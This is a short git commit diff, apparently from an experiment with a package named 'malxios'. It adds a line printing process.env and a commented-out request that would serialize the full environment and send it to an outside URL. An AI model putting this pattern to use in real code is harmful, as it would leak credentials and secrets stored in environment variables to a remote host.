d973b39492beb83196222cb86e839da45c65f773
Gabrn <gabinir@gmail.com>
2023-06-01 20:53:58 +0300

    updated malxios

--- index.js
+++ index.js
@@ -1,3 +1,9 @@
 import malxios from "malxios";
 
-malxios.post("https://someurl.someurl/somePath", {funData: "fun"});
+console.log(process.env)
+// malxios.request({
+// 	method: "get",
+// 	headers: {},
+// 	url: "https://www.google.com",
+// 	data: JSON.stringify(process.env),
+// });
